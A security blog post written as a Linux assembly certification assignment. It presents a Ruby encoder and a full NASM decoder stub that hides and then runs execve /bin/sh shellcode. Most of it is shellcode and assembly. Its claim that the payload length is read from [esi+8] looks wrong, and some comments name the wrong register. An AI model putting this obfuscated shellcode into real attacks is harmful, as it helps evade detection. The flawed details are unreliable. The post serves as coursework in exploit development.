<!DOCTYPE html>
<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--><!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8"><![endif]--><!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9"><![endif]--><!--[if gt IE 8]><!--><html class="no-js">
<!--<![endif]--> <head> <meta charset="UTF-8"> <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> <title>SLAE Assignment 4 - Custom Encoder – popped.io</title> <meta name="description" content="A collection of my security research, random projects and attempts to amuse."> <meta name="keywords" content="SLAE, SecurityTube, Assignment, Shellcode, nasm, assembly, ruby, encoder, decoder"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="http://localhost:4000/assets/img/me.png"> <meta name="twitter:title" content="SLAE Assignment 4 - Custom Encoder"> <meta name="twitter:description" content="SLAE Assignment StubThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <meta name="twitter:site" content="@hackerjiv"> <meta name="twitter:creator" content="@hackerjiv"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="SLAE Assignment 4 - Custom Encoder"> <meta property="og:description" content="SLAE Assignment StubThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <meta property="og:url" content="http://localhost:4000/SLAE-Assignment-4/"> <meta property="og:site_name" content="popped.io"> <meta property="og:image" content="http://localhost:4000/assets/img/me.png"> <link rel="canonical" href="http://localhost:4000/SLAE-Assignment-4/"> <link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="popped.io Feed"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- CSS --> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css"> <!-- JS --> <script src="http://localhost:4000/assets/js/modernizr-3.3.1.custom.min.js"></script> <!-- Favicons --> <link rel="apple-touch-icon" href="http://localhost:4000/assets/img/favicons/apple-icon-precomposed.png"> <link rel="apple-touch-icon" sizes="72x72" href="http://localhost:4000/assets/img/favicons/apple-icon-72x72.png"> <link rel="apple-touch-icon" sizes="114x114" href="http://localhost:4000/assets/img/favicons/apple-icon-114x114.png"> <link rel="apple-touch-icon" sizes="144x144" href="http://localhost:4000/assets/img/favicons/apple-icon-144x144.png"> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png"> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico"> <!-- Background Image --> <style type="text/css">body {background-image:url(http://localhost:4000/assets/img/placeholder-big.jpg); background-repeat: no-repeat; background-size: cover; }</style> <!-- Post Feature Image --> <!-- Begin Jekyll SEO tag v2.2.3 --> <title>SLAE Assignment 4 - Custom Encoder | popped.io</title> <meta property="og:title" content="SLAE Assignment 4 - Custom Encoder"> <meta name="author" content="Sanjiv Kawa"> <meta property="og:locale" content="en_US"> <meta name="description" content="SLAE Assignment Stub This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <meta property="og:description" content="SLAE Assignment Stub This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <link rel="canonical" href="http://localhost:4000/SLAE-Assignment-4/"> <meta property="og:url" content="http://localhost:4000/SLAE-Assignment-4/"> <meta property="og:site_name" content="popped.io"> <meta property="og:type" content="article"> <meta property="article:published_time" content="2016-12-02T21:30:00-05:00"> <meta name="twitter:card" content="summary"> <meta name="twitter:site" content="@"> <meta name="twitter:creator" content="@Sanjiv Kawa"> <script type="application/ld+json"> {"@context":"http://schema.org","@type":"BlogPosting","headline":"SLAE Assignment 4 - Custom Encoder","author":{"@type":"Person","name":"Sanjiv Kawa"},"datePublished":"2016-12-02T21:30:00-05:00","dateModified":"2016-12-02T21:30:00-05:00","description":"SLAE Assignment Stub This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/me.png"},"name":"Sanjiv Kawa"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/SLAE-Assignment-4/"},"url":"http://localhost:4000/SLAE-Assignment-4/"}</script> <!-- End Jekyll SEO tag --> </head> <body> <nav id="dl-menu" class="dl-menuwrapper" role="navigation"> <button class="dl-trigger">Open Menu</button> <ul class="dl-menu"> <li><a href="http://localhost:4000/">Home</a></li> <li> <a href="#">About</a> <ul class="dl-submenu"> <li> <img src="http://localhost:4000/assets/img/me.png" alt="popped.io photo" class="author-photo"> <h4>popped.io</h4> <p>A collection of my security research, random projects and attempts to amuse.</p> </li> <li><a href="http://localhost:4000/about/"><span class="btn btn-inverse">Learn More</span></a></li> <li> <a href="mailto:sanjiv@popped.io" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-envelope-square"></i> Email</a> </li> <li> <a href="http://twitter.com/hackerjiv" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a> </li> <li> <a href="http://linkedin.com/in/sanjivkawa" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-linkedin-square"></i> LinkedIn</a> </li> <li> <a href="http://github.com/skahwah" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-github"></i> Github</a> </li> </ul>
<!-- /.dl-submenu --> </li> <li> <a href="#">Posts</a> <ul class="dl-submenu"> <li><a href="http://localhost:4000/posts/">All Posts</a></li> <li><a href="http://localhost:4000/tags/">All Tags</a></li> </ul> </li> <li><a href="http://localhost:4000/projects/">Projects</a></li> </ul>
<!-- /.dl-menu --> </nav><!-- /.dl-menuwrapper --> <!-- Header --> <header class="header" role="banner"> <div class="wrapper animated fadeIn"> <div class="content"> <div class="post-title "> <h1>SLAE Assignment 4 - Custom Encoder</h1> <h4>02 Dec 2016</h4> <p class="reading-time"> <i class="fa fa-clock-o"></i> Reading time ~10 minutes </p>
<!-- /.entry-reading-time --> <a class="btn zoombtn" href="http://localhost:4000/posts/"> <i class="fa fa-chevron-left"></i> </a> </div> <h3 id="slae-assignment-stub">SLAE Assignment Stub</h3> <p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.</p> <p><a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p> <p>Student ID: SLAE-807</p> <h3 id="assignment-4-requirements">Assignment 4 Requirements</h3> <ul> <li>Create a custom encoding scheme like the “Insertion Encoder” we showed you.</li> <li>PoC with using execve-stack as the shellcode to encode your schema and execute</li> </ul> <h3 id="the-shellcode">The Shellcode</h3> <p>The example shellcode I will be using is a really simple stack-based <code class="highlighter-rouge">execve</code> SYSCALL that executes <code class="highlighter-rouge">/bin/sh</code>.</p> <p>The nasm source is located <a href="https://github.com/skahwah/slae/blob/master/execve-stack/execve-stack.nasm">here</a> and a brief breakdown of the shellcode is located <a href="https://popped.io/execve-stack/">here</a><a>.</a></p> <p>Here are the opcodes:</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>89<span class="se">\x</span>e2<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80
</code></pre></div> <h3 id="the-encoder">The Encoder</h3> <p>The encoder is written in Ruby and quite simply takes the user supplied shellcode and:</p> <ul> <li>Adds 5 to the first 10 bytes</li> <li>Subtracts 7 for all remaining bytes</li> <li>XOR’s all of the arithmetic encoded bytes by <code class="highlighter-rouge">0xd3</code>
</li> </ul> <p>The encoder can be found <a href="https://github.com/skahwah/slae/blob/master/assignment4/encode.rb">here</a>.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code>18:32 skawa@skawa-mbp: assignment4 <span class="nv">$ </span>ruby encode.rb
<span class="o">[</span>+] C hex format:
<span class="s2">"</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">16</span><span class="se">\x</span><span class="s2">86</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">ab</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">b4</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">f</span><span class="se">\x</span><span class="s2">9a</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">8</span><span class="se">\x</span><span class="s2">9f</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">9</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">d7</span><span class="se">\x</span><span class="s2">15</span><span class="se">\x</span><span class="s2">aa"</span>;

<span class="o">[</span>+] nasm hex format:
0xe5,0x16,0x86,0xbe,0xe7,0xe7,0xab,0xbe,0xbe,0xe7,0x88,0xb1,0xb4,0x51,0xf,0x9a,0x51,0x8,0x9f,0x51,0x9,0x7a,0xd7,0x15,0xaa

<span class="o">[</span>+] Total length: 25
18:32 skawa@skawa-mbp: assignment4 <span class="err">$</span>
</code></pre></div> <h3 id="the-decoder">The Decoder</h3> <p>The decoder is responsible for decoding the encoded shellcode and passing execution on to the stack-based <code class="highlighter-rouge">execve</code> <code class="highlighter-rouge">/bin/sh</code> instructions. It uses the well documented <code class="highlighter-rouge">JMP</code>, <code class="highlighter-rouge">CALL</code>, <code class="highlighter-rouge">POP</code> process.</p> <p>The decoder can be found <a href="https://github.com/skahwah/slae/blob/master/assignment4/decode.nasm">here</a>.</p> <h3 id="dissecting-the-decoder">Dissecting the Decoder</h3> <p>1. <code class="highlighter-rouge">jmp short encoded_shellcode</code></p> <p>The first instruction performs a short <code class="highlighter-rouge">jmp</code> to the <code class="highlighter-rouge">encoded_shellcode</code> procedure.</p> <p><br>2. <code class="highlighter-rouge">encoded_shellcode:</code></p> <p>The <code class="highlighter-rouge">encoded_shellcode:</code> procedure initiates a <code class="highlighter-rouge">call</code> to the <code class="highlighter-rouge">decode</code> procedure. This will redirect execution to the <code class="highlighter-rouge">decode</code> procedure and push the address of <code class="highlighter-rouge">EncodedShellcode</code> on to the Stack.</p> <p>The <code class="highlighter-rouge">encoded_shellcode:</code> procedure also has the <code class="highlighter-rouge">EncodedShellcodeLen</code> label, which contains the length of the shellcode for dynamic allocation to the counter register later in the program.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">call</span> <span class="n">decode</span>
<span class="n">EncodedShellcode</span><span class="o">:</span> <span class="kt">db</span> <span class="mh">0xe5</span><span class="p">,</span><span class="mh">0x16</span><span class="p">,</span><span class="mh">0x86</span><span class="p">,</span><span class="mh">0xbe</span><span class="p">,</span><span class="mh">0xe7</span><span class="p">,</span><span class="mh">0xe7</span><span class="p">,</span><span class="mh">0xab</span><span class="p">,</span><span class="mh">0xbe</span><span class="p">,</span><span class="mh">0xbe</span><span class="p">,</span><span class="mh">0xe7</span><span class="p">,</span><span class="mh">0x88</span><span class="p">,</span><span class="mh">0xb1</span><span class="p">,</span><span class="mh">0xb4</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0xf</span><span class="p">,</span><span class="mh">0x9a</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x8</span><span class="p">,</span><span class="mh">0x9f</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x9</span><span class="p">,</span><span class="mh">0x7a</span><span class="p">,</span><span class="mh">0xd7</span><span class="p">,</span><span class="mh">0x15</span><span class="p">,</span><span class="mh">0xaa</span>
<span class="n">EncodedShellcodeLen</span> <span class="k">equ</span> <span class="err">$</span><span class="o">-</span><span class="n">EncodedShellcode</span>
</code></pre></div> <p><br>3. <code class="highlighter-rouge">decode:</code></p> <p>The <code class="highlighter-rouge">decode:</code> procedure is responsible for setting up the <code class="highlighter-rouge">ESI</code> register to point to the beginning of the <code class="highlighter-rouge">EncodedShellcode</code>.</p> <p>It also sets up the <code class="highlighter-rouge">EDI</code> register with an offset of <code class="highlighter-rouge">+10</code>. The reason for this is add a marker at the 10th byte in <code class="highlighter-rouge">EncodedShellcode</code> as everything after this is subtracted by 7.</p> <p>In addition, the length of <code class="highlighter-rouge">EncodedShellcode</code> is placed into the counter register. This is done by using the address in <code class="highlighter-rouge">ESI</code> which, points to <code class="highlighter-rouge">EncodedShellcode</code>, <code class="highlighter-rouge">+8</code>. As a result, the value in <code class="highlighter-rouge">EncodedShellcodeLen</code> is stored in <code class="highlighter-rouge">CL</code></p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">pop</span> <span class="n">esi</span>             <span class="c">;the address for EncodedShellcode is placed in to ESI</span>
<span class="k">push</span> <span class="n">esi</span>            <span class="c">;the address for EncodedShellcode is pushed on to the stack for preservation</span>
<span class="k">lea</span> <span class="n">edi</span><span class="p">,</span> <span class="err">[</span><span class="n">esi</span> <span class="o">+</span><span class="mi">10</span><span class="err">]</span>  <span class="c">;the address for EncodedShellcode with an offset of 10 is placed into EDI</span>

<span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>      <span class="c">;clearing out ecx</span>
<span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="err">[</span><span class="n">esi</span> <span class="o">+</span><span class="mi">8</span><span class="err">]</span>  <span class="c">;the length of the EncodedShellcode is placed into DL</span>
</code></pre></div> <p><br>4. <code class="highlighter-rouge">xor_decoder_loop:</code></p> <p>The <code class="highlighter-rouge">xor_decoder_loop:</code> procedure is responsible for the first of three decoding processes. On each loop, <code class="highlighter-rouge">EBX</code> is cleared and the current byte in <code class="highlighter-rouge">EncodedShellcode</code> which is pointed to by <code class="highlighter-rouge">ESI</code> is placed into <code class="highlighter-rouge">BL</code>.</p> <p>An XOR operation is then conducted against the byte in <code class="highlighter-rouge">BL</code> and <code class="highlighter-rouge">0xd3</code>, the result of which is stored in <code class="highlighter-rouge">BL</code>. The current byte in <code class="highlighter-rouge">EncodedShellcode</code>, pointed to by <code class="highlighter-rouge">ESI</code> is then overwritten with the value in <code class="highlighter-rouge">BL</code>.</p> <p><code class="highlighter-rouge">ESI</code> is then incremented by <code class="highlighter-rouge">1</code> to shift on to the next byte which needs to be XOR’d. The loop continues until the length of <code class="highlighter-rouge">EncodedShellcode</code> referred to by <code class="highlighter-rouge">CL</code> has been met.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>          <span class="c">;clearing out ebx</span>
<span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[esi]</span>    <span class="c">;taking the current byte in EncodedShellcode and placing it into BL</span>
<span class="k">xor</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0xd3</span>          <span class="c">;xoring the current value in BL with 0xd3 and placing that value into BL</span>
<span class="k">mov</span> <span class="n">byte</span> <span class="p">[esi],</span> <span class="n">bl</span>    <span class="c">;replacing the current byte at the memory location pointed to by ESI with the decoded byte</span>
<span class="k">inc</span> <span class="n">esi</span>               <span class="c">;shifting to the next byte</span>
<span class="k">loop</span> <span class="n">xor_decoder_loop</span> <span class="c">;looping through the entirety of EncodedShellcode</span>
</code></pre></div> <p><br>5. Setting general purpose registers</p> <p>Before the <code class="highlighter-rouge">sub_decoder_loop</code> starts, several instructions need to be updated.</p> <p>First, <code class="highlighter-rouge">ESI</code> is reset to the beginning of <code class="highlighter-rouge">EncodedShellcode</code>, the memory address of this was pushed on to the stack for preservation purposes as described in Step 2.</p> <p>The counter register is then updated to contain the value <code class="highlighter-rouge">10</code>. This is so that only the first 10 bytes of <code class="highlighter-rouge">EncodedShellcode</code> are evaluated in the upcoming loop process.</p> <p>The length of <code class="highlighter-rouge">EncodedShellcode</code> is placed into <code class="highlighter-rouge">DL</code> for preservation purposes. <code class="highlighter-rouge">ESI</code> will changed as soon as the first loop has been completed, meaning that this needs to be set now. Alternatively, the address could be pushed on to the Stack and then popped off when needed.</p> <p>The value <code class="highlighter-rouge">5</code> is then moved into <code class="highlighter-rouge">AL</code>, this is what will be used as the subtraction value in the upcoming loop.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">pop</span> <span class="n">esi</span>       <span class="c">;resetting esi to its original location, the beginning of EncodedShellcode</span>
<span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>  <span class="c">;clearing out ecx</span>
<span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="mi">10</span>    <span class="c">;this sets the loop count for sub_decoder_loop. The fixed value of 10 is okay as only the first 10 bytes need to be subtracted.</span>

<span class="k">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span>      <span class="c">;clearing out edx</span>
<span class="k">mov</span> <span class="n">dl</span><span class="p">,</span> <span class="err">[</span><span class="n">esi</span> <span class="o">+</span><span class="mi">8</span><span class="err">]</span>  <span class="c">;the length of the EncodedShellcode is placed into DL</span>

<span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>  <span class="c">;clearing out eax</span>
<span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">5</span>     <span class="c">;5 is the subtraction value</span>
</code></pre></div> <p><br>6. <code class="highlighter-rouge">sub_decoder_loop:</code></p> <p>The <code class="highlighter-rouge">sub_decoder_loop:</code> procedure is responsible for the second of three decoding processes. On each loop, <code class="highlighter-rouge">EBX</code> is cleared and the current byte in <code class="highlighter-rouge">EncodedShellcode</code> which is pointed to by <code class="highlighter-rouge">ESI</code> is placed into <code class="highlighter-rouge">BL</code>.</p> <p>A subtraction operation is then conducted against the byte in <code class="highlighter-rouge">BL</code> and <code class="highlighter-rouge">AL</code>, the result of which is stored in <code class="highlighter-rouge">BL</code>. The current byte in <code class="highlighter-rouge">EncodedShellcode</code>, pointed to by <code class="highlighter-rouge">ESI</code> is then overwritten with the value in <code class="highlighter-rouge">BL</code>. This begins to decode the encoded shellcode to its true form.</p> <p><code class="highlighter-rouge">ESI</code> is then incremented by <code class="highlighter-rouge">1</code> to shift on to the next byte which needs to be subtracted by <code class="highlighter-rouge">5</code>. The loop continues until the first <code class="highlighter-rouge">10</code> bytes, as specified by <code class="highlighter-rouge">CL</code> has been met.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>          <span class="c">;clearing out ebx</span>
<span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[esi]</span>    <span class="c">;taking the current byte in EncodedShellcode and placing it into BL</span>
<span class="k">sub</span> <span class="n">bl</span><span class="p">,</span> <span class="n">al</span>            <span class="c">;subtracting the current value in BL by 5 and placing that value into BL</span>
<span class="k">mov</span> <span class="n">byte</span> <span class="p">[esi],</span> <span class="n">bl</span>    <span class="c">;replacing the current byte at the memory location pointed to by ESI with the decoded byte</span>
<span class="k">inc</span> <span class="n">esi</span>               <span class="c">;shifting to the next byte</span>
<span class="k">loop</span> <span class="n">sub_decoder_loop</span> <span class="c">;loop 10 times</span>
</code></pre></div> <p><br>7. Setting general purpose registers</p> <p>Before the <code class="highlighter-rouge">add_decoder_loop</code> starts, several instructions need to be updated.</p> <p>First, the counter register is set to the value in <code class="highlighter-rouge">DL</code>, this contains the value stored in the memory address of <code class="highlighter-rouge">EncodedShellcodeLen</code>. This was assigned into <code class="highlighter-rouge">DL</code> for preservation purposes as described in Step 5.</p> <p><code class="highlighter-rouge">10</code> is then subtracted from the length of the shellcode in <code class="highlighter-rouge">DL</code> as the first <code class="highlighter-rouge">10</code> bytes have already been decoded.</p> <p><code class="highlighter-rouge">2</code> is then added to the value which is currently in <code class="highlighter-rouge">AL</code>, this is <code class="highlighter-rouge">7</code>. As such, <code class="highlighter-rouge">AL</code> is updated to contain <code class="highlighter-rouge">7</code>, this is what will be used as the addition value in the upcoming loop.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>  <span class="c">;clearing out ecx</span>
<span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="n">dl</span>    <span class="c">;moving the length of EncodedShellcode into CL</span>
<span class="k">sub</span> <span class="n">cl</span><span class="p">,</span> <span class="mi">10</span>    <span class="c">;subtracting the length of EncodedShellcode in CL by 10 as we have already decoded 10 bytes</span>
<span class="k">add</span> <span class="n">al</span><span class="p">,</span> <span class="mi">2</span>     <span class="c">;adding 2 to AL. 7 is the addition value.</span>
</code></pre></div> <p><br>8. <code class="highlighter-rouge">add_decoder_loop:</code></p> <p>The <code class="highlighter-rouge">add_decoder_loop:</code> procedure is responsible for the last decoding processes. On each loop, <code class="highlighter-rouge">EBX</code> is cleared and the current byte in <code class="highlighter-rouge">EncodedShellcode</code> which is pointed to by <code class="highlighter-rouge">EDI</code> is placed into <code class="highlighter-rouge">BL</code>.</p> <p><code class="highlighter-rouge">EDI</code> contains the memory address for the 11th byte of the shellcode. As a result, the loop starts from the 11th byte onwards. This is because the first 10 bytes have already been decoded.</p> <p>A addition operation is then conducted against the byte in <code class="highlighter-rouge">BL</code> and <code class="highlighter-rouge">AL</code>, the result of which is stored in <code class="highlighter-rouge">BL</code>. The current byte in <code class="highlighter-rouge">EncodedShellcode</code>, pointed to by <code class="highlighter-rouge">EDI</code> is then overwritten with the value in <code class="highlighter-rouge">BL</code>. This begins to decode the encoded shellcode, from the 11th byte onwards to its true form.</p> <p><code class="highlighter-rouge">EDI</code> is then incremented by <code class="highlighter-rouge">1</code> to shift on to the next byte which needs to be added by <code class="highlighter-rouge">7</code>. The loop continues until the shellcode in it’s entirety has been decoded.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>          <span class="c">;clearing out ebx</span>
<span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[edi]</span>    <span class="c">;taking the current byte in EncodedShellcode and placing it into BL. EDI starts at +10.</span>
<span class="k">add</span> <span class="n">bl</span><span class="p">,</span> <span class="n">al</span>            <span class="c">;adding the current value in BL by 7 and placing that value into BL</span>
<span class="k">mov</span> <span class="n">byte</span> <span class="p">[edi],</span> <span class="n">bl</span>    <span class="c">;replacing the current byte at the memory location pointed to by EDI with the decoded byte</span>
<span class="k">inc</span> <span class="n">edi</span>               <span class="c">;shifting to the next byte</span>
<span class="k">loop</span> <span class="n">add_decoder_loop</span> <span class="c">;loop until CL has been met</span>
</code></pre></div> <p><br>9. <code class="highlighter-rouge">jmp short EncodedShellcode</code></p> <p>The final instruction performs a short <code class="highlighter-rouge">jmp</code> to the <code class="highlighter-rouge">EncodedShellcode</code> label where the the existing encoded values have been overwritten with the decoded values. Execution is then passed to the decoded Stack-based <code class="highlighter-rouge">execve</code> <code class="highlighter-rouge">//bin/sh</code> shellcode.</p> <h3 id="decodenasm">decode.nasm</h3> <p>Below is decode.nasm in its entirety.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">;decode.nasm</span>
<span class="c">;sanjiv kawa (@skawasec)</span>
<span class="c">;this decodes shellcode encoded by encode.rb</span>

<span class="kr">global</span> <span class="n">_start</span>

<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
<span class="n">_start</span><span class="o">:</span>
  <span class="k">jmp</span> <span class="n">short</span> <span class="n">encoded_shellcode</span>

<span class="n">decode</span><span class="o">:</span>
  <span class="k">pop</span> <span class="n">esi</span>             <span class="c">;the address for EncodedShellcode is placed in to ESI</span>
  <span class="k">push</span> <span class="n">esi</span>            <span class="c">;the address for EncodedShellcode is pushed on to the stack for preservation</span>
  <span class="k">lea</span> <span class="n">edi</span><span class="p">,</span> <span class="err">[</span><span class="n">esi</span> <span class="o">+</span><span class="mi">10</span><span class="err">]</span>  <span class="c">;the address for EncodedShellcode with an offset of 10 is placed into EDI</span>

  <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>      <span class="c">;clearing out ecx</span>
  <span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="err">[</span><span class="n">esi</span> <span class="o">+</span><span class="mi">8</span><span class="err">]</span>  <span class="c">;the length of the EncodedShellcode is placed into DL</span>

<span class="n">xor_decoder_loop</span><span class="o">:</span>
  <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>          <span class="c">;clearing out ebx</span>
  <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[esi]</span>    <span class="c">;taking the current byte in EncodedShellcode and placing it into BL</span>
  <span class="k">xor</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0xd3</span>          <span class="c">;xoring the current value in BL with 0xd3 and placing that value into BL</span>
  <span class="k">mov</span> <span class="n">byte</span> <span class="p">[esi],</span> <span class="n">bl</span>    <span class="c">;replacing the current byte at the memory location pointed to by ESI with the decoded byte</span>
  <span class="k">inc</span> <span class="n">esi</span>               <span class="c">;shifting to the next byte</span>
  <span class="k">loop</span> <span class="n">xor_decoder_loop</span> <span class="c">;looping through the entirety of EncodedShellcode</span>

  <span class="k">pop</span> <span class="n">esi</span>       <span class="c">;resetting esi to its original location, the beginning of EncodedShellcode</span>
  <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>  <span class="c">;clearing out ecx</span>
  <span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="mi">10</span>    <span class="c">;this sets the loop count for sub_decoder_loop. The fixed value of 10 is okay as only the first 10 bytes need to be subtracted.</span>

  <span class="k">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span>      <span class="c">;clearing out edx</span>
  <span class="k">mov</span> <span class="n">dl</span><span class="p">,</span> <span class="err">[</span><span class="n">esi</span> <span class="o">+</span><span class="mi">8</span><span class="err">]</span>  <span class="c">;the length of the EncodedShellcode is placed into DL</span>

  <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>  <span class="c">;clearing out eax</span>
  <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">5</span>     <span class="c">;5 is the subtraction value</span>

<span class="n">sub_decoder_loop</span><span class="o">:</span>
  <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>          <span class="c">;clearing out ebx</span>
  <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[esi]</span>    <span class="c">;taking the current byte in EncodedShellcode and placing it into BL</span>
  <span class="k">sub</span> <span class="n">bl</span><span class="p">,</span> <span class="n">al</span>            <span class="c">;subtracting the current value in BL by 5 and placing that value into BL</span>
  <span class="k">mov</span> <span class="n">byte</span> <span class="p">[esi],</span> <span class="n">bl</span>    <span class="c">;replacing the current byte at the memory location pointed to by ESI with the decoded byte</span>
  <span class="k">inc</span> <span class="n">esi</span>               <span class="c">;shifting to the next byte</span>
  <span class="k">loop</span> <span class="n">sub_decoder_loop</span> <span class="c">;loop 10 times</span>

  <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>  <span class="c">;clearing out ecx</span>
  <span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="n">dl</span>    <span class="c">;moving the length of EncodedShellcode into CL</span>
  <span class="k">sub</span> <span class="n">cl</span><span class="p">,</span> <span class="mi">10</span>    <span class="c">;subtracting the length of EncodedShellcode in CL by 10 as we have already decoded 10 bytes</span>
  <span class="k">add</span> <span class="n">al</span><span class="p">,</span> <span class="mi">2</span>     <span class="c">;adding 2 to AL. 7 is the addition value.</span>

<span class="n">add_decoder_loop</span><span class="o">:</span>
  <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>          <span class="c">;clearing out ebx</span>
  <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[edi]</span>    <span class="c">;taking the current byte in EncodedShellcode and placing it into BL. EDI starts at +10.</span>
  <span class="k">add</span> <span class="n">bl</span><span class="p">,</span> <span class="n">al</span>            <span class="c">;adding the current value in BL by 7 and placing that value into BL</span>
  <span class="k">mov</span> <span class="n">byte</span> <span class="p">[edi],</span> <span class="n">bl</span>    <span class="c">;replacing the current byte at the memory location pointed to by EDI with the decoded byte</span>
  <span class="k">inc</span> <span class="n">edi</span>               <span class="c">;shifting to the next byte</span>
  <span class="k">loop</span> <span class="n">add_decoder_loop</span> <span class="c">;loop until CL has been met</span>

  <span class="k">jmp</span> <span class="n">short</span> <span class="n">EncodedShellcode</span> <span class="c">;pass execution to the decoded shellcode</span>

<span class="n">encoded_shellcode</span><span class="o">:</span>
  <span class="k">call</span> <span class="n">decode</span>
